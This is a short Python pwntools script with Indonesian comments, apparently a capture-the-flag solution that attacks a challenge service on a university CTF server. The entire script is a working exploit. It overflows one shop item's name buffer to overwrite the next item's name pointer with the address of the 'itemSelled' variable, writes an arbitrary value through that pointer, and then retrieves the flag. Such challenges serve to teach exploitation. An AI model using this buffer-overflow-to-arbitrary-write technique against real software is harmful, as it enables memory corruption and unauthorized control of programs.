#!/usr/bin/python3
from pwn import *

# Memuat file biner
elf = context.binary = ELF("chall")

# Mendirikan koneksi ke server
server = remote("ctf99.cs.ui.ac.id", 10021)

def add_item(name, price):
    server.sendlineafter(b"> ", b"1")
    server.sendlineafter(b": ", name)
    server.sendlineafter(b": ", price)

def edit_item(index, name, price):
    server.sendlineafter(b"> ", b"2")
    server.sendlineafter(b": ", index)
    server.sendlineafter(b": ", name)
    server.sendlineafter(b": ", price)

def get_flag():
    server.sendlineafter(b"> ", b"5")

# Menambahkan dua item ke toko
add_item(b"A", str(1).encode())
add_item(b"A", str(1).encode())

# Mengedit item pertama, menimpa alamat 'name' item kedua
# dengan alamat 'itemSelled' menggunakan buffer overflow
edit_item(str(0).encode(), b"A" * 56 + p64(elf.sym.itemSelled), str(1).encode())

# Mengedit item kedua. Hal ini akan menulis ke 'itemSelled' 
# karena 'name' item kedua sekarang menunjuk ke 'itemSelled'.
edit_item(str(1).encode(), p64(0x1234567812345678), str(1).encode())

# Meminta flag
get_flag()

# Beralih ke mode interaktif untuk membaca flag
server.interactive()
